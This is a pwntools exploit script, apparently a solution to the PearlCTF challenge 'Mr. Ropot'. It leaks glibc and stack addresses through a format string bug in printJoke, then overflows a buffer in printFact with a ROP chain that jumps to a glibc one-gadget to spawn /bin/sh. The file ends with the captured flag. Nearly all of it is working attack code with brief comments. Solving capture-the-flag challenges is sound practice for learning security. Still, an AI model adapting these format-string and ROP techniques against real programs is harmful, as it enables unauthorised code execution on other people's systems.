from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./chall_patched','''
    b *(printJoke+138)
    b *(printFact+159)
    continue
''')

# p = remote('mr---ropot.ctf.pearlctf.in', 30009)

# 1. leak glibc base address and valid rbp value with format string
# enter printJoke function
p.sendline(b'1')
p.sendlineafter(b"Did you like the joke? Leave a response: \n", b'%1$p%9$p')
p.recvuntil(b"Your Response:\n")
leaks = p.recvline().strip().decode()
glibc_base_addr = int(leaks[0:14], 16)-0x204643
log.info(f"glibc base addr: {hex(glibc_base_addr)}")
current_rbp_val = int(leaks[14:30], 16)
log.info(f"current rbp value: {hex(current_rbp_val)}")

# 2. ROP with one gadget
# enter printFact function
p.sendline(b'2')
# 0xef4ce execve("/bin/sh", rbp-0x50, r12)
# constraints:
#   address rbp-0x48 is writable
#   rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
#   [r12] == NULL || r12 == NULL || r12 is a valid envp
glibc_r = ROP('./libc.so.6')
chain = [
    glibc_base_addr+glibc_r.rbx.address, 0,
    glibc_base_addr+glibc_r.r12.address, 0,
    glibc_base_addr+0xef4ce
]
p.sendlineafter(b"Did you like the fact? Leave a response: \n", b'A'*0x30+p64(current_rbp_val+0x48)+b''.join([p64(c) for c in chain]))

p.interactive()

# pearl{fin4lly_g0t_my_fl4g_th4nks_printf}